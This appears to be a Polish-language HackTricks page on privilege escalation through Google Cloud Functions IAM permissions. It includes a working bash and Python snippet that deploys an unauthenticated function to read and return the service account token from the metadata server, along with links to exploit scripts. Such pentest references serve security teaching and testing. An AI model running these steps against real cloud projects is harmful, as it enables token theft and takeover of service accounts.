# GCP - Cloudfunctions Privesc

{{#include ../../../banners/hacktricks-training.md}}

## cloudfunctions

Więcej informacji o Cloud Functions:

{{#ref}}
../gcp-services/gcp-cloud-functions-enum.md
{{#endref}}

### `cloudfunctions.functions.create` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

Napastnik z tymi uprawnieniami może **utworzyć nową Cloud Function z dowolnym (złośliwym) kodem i przypisać jej konto usługi**. Następnie, wyciekając token konta usługi z metadanych, może podnieść swoje uprawnienia do tego konta.\
Możliwe, że będą wymagane pewne uprawnienia do wywołania funkcji.

Skrypty exploitacyjne dla tej metody można znaleźć [tutaj](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-call.py) oraz [tutaj](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-setIamPolicy.py), a gotowy plik .zip można znaleźć [tutaj](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/tree/master/ExploitScripts/CloudFunctions).

### `cloudfunctions.functions.update` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

Napastnik z tymi uprawnieniami może **zmodyfikować kod funkcji, a nawet zmienić przypisane konto usługi** w celu wyeksfiltrowania tokena.

> [!CAUTION]
> Aby wdrożyć funkcje chmurowe, będziesz również potrzebować uprawnień actAs dla domyślnego konta usługi obliczeniowej lub dla konta usługi, które jest używane do budowy obrazu.

Możliwe, że będą wymagane dodatkowe uprawnienia, takie jak uprawnienie `.call` dla wersji 1 cloudfunctions lub rola `role/run.invoker` do wywołania funkcji.
```bash
# Create new code
temp_dir=$(mktemp -d)

cat > $temp_dir/main.py <<EOF
import subprocess

def main(request):
cmd = "curl -s -f -H 'Metadata-Flavor: Google' 'http://metadata/computeMetadata/v1/instance/service-accounts/default/token'"
result = subprocess.check_output(cmd, shell=True, text=True)
return result
EOF

echo "" > $temp_dir/requirements.txt

zip -r $temp_dir/function.zip $temp_dir/main.py $temp_dir/requirements.txt

# Update code
gcloud functions deploy <cloudfunction-name> \
--runtime python312 \
--source $temp_dir \
--entry-point main \
--service-account <sa>@$PROJECT_ID.iam.gserviceaccount.com \
--trigger-http \
--allow-unauthenticated

# Get SA token calling the new function code
gcloud functions call <cloudfunction-name>
```
> [!CAUTION]
> Jeśli otrzymasz błąd `Permission 'run.services.setIamPolicy' denied on resource...`, to dlatego, że używasz parametru `--allow-unauthenticated` i nie masz wystarczających uprawnień.

Skrypt exploitujący dla tej metody można znaleźć [tutaj](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.update.py).

### `cloudfunctions.functions.sourceCodeSet`

Dzięki temu uprawnieniu możesz uzyskać **podpisany URL, aby móc przesłać plik do koszyka funkcji (ale kod funkcji nie zostanie zmieniony, nadal musisz go zaktualizować)**
```bash
# Generate the URL
curl -X POST https://cloudfunctions.googleapis.com/v2/projects/{project-id}/locations/{location}/functions:generateUploadUrl \
-H "Authorization: Bearer $(gcloud auth application-default print-access-token)" \
-H "Content-Type: application/json" \
-d '{}'
```
Nie jestem pewien, jak przydatne jest tylko to uprawnienie z perspektywy atakującego, ale dobrze wiedzieć.

### `cloudfunctions.functions.setIamPolicy`, `iam.serviceAccounts.actAs`

Nadaj sobie dowolne z wcześniejszych **`.update`** lub **`.create`** uprawnień, aby eskalować.

### `cloudfunctions.functions.update`

Mając tylko uprawnienia **`cloudfunctions`**, bez **`iam.serviceAccounts.actAs`**, **nie będziesz w stanie zaktualizować funkcji, WIĘC TO NIE JEST WAŻNA ESCALACJA.**

### Dostęp do odczytu i zapisu w koszyku

Jeśli masz dostęp do odczytu i zapisu w koszyku, możesz monitorować zmiany w kodzie, a gdy tylko **nastąpi aktualizacja w koszyku, możesz zaktualizować nowy kod swoim własnym kodem**, który nowa wersja Cloud Function będzie uruchamiana z przesłanym złośliwym kodem.

Możesz sprawdzić więcej na temat ataku w:

{{#ref}}
gcp-storage-privesc.md
{{#endref}}

Jednak nie możesz użyć tego do wstępnego kompromitowania funkcji Cloud innych firm, ponieważ jeśli stworzysz koszyk na swoim koncie i nadasz mu publiczne uprawnienia, aby zewnętrzny projekt mógł na nim pisać, otrzymasz następujący błąd:

<figure><img src="../../../images/image (1) (1) (1).png" alt="" width="304"><figcaption></figcaption></figure>

> [!OSTRZEŻENIE]
> Jednak może to być użyte do ataków DoS.

### Dostęp do odczytu i zapisu w rejestrze artefaktów

Gdy tworzona jest funkcja Cloud, nowy obraz docker jest przesyłany do rejestru artefaktów projektu. Próbowałem zmodyfikować obraz na nowy, a nawet usunąć bieżący obraz (i obraz `cache`), ale nic się nie zmieniło, funkcja chmurowa nadal działa. Dlatego może **możliwe jest nadużycie ataku Race Condition** jak w przypadku koszyka, aby zmienić kontener docker, który będzie uruchamiany, ale **po prostu modyfikacja przechowywanego obrazu nie jest możliwa do kompromitacji funkcji Cloud**.

## Odniesienia

- [https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)

{{#include ../../../banners/hacktricks-training.md}}
